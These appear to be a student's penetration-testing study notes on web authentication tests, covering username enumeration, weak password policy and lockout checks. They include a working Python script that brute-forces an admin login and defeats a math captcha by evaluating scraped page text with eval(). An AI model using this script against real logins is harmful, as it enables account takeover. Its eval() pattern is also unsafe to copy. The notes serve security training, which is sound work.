![[Pasted image 20260513234059.png]]
![[Pasted image 20260513234154.png]]

## Username Enumeration
- Find out existing users in the application through different error responses in authentication mechanisms
- Commonly found on 'Forgot Password' pages
- Use Burp Intruder to Brute Force enumeration

## Test for weak password policy (WSTG-ATHN -07)
- Dictionary or Brute Force attack
- Focus Areas
	- Password complexity
	- Account Lockouts
	- Error messages

## Test for weak lockout mechanisms
### Brute-forcing mathematical Captcha using Python

```python
import re
import requests

session = requests.Session()

regex = '<h4 style="text-align: center;margin-top: 4px"> (.*?) = </h4>'

with open('passwords.txt', 'r') as f:
    for password in f:
        password = password.rstrip()

        response = session.get('http://192.197.53.3')
        output = re.search(regex, response.text)

        cookies = session.cookies.get_dict()
        captcha = eval(output.group(1))

        print("Trying Password: " + password)

        data = {
            "username": "admin",
            "password": password,
            "captcha": captcha
        }

        output = session.post(
            'http://192.197.53.3/login',
            cookies=cookies,
            data=data
        )

        # ✅ THIS MUST BE INSIDE THE LOOP
        if "Error" not in output.text:
            print("Password Found: " + password)
            break
```

## Account Lockout Bypass

>[!Important]
>```dirb``` - directory buster
```searchsploit``` - search for exploits
> Look in the source code for service versions and search for exploits
## Bypassing Authentication Schema (WSTG-ATHN-04)

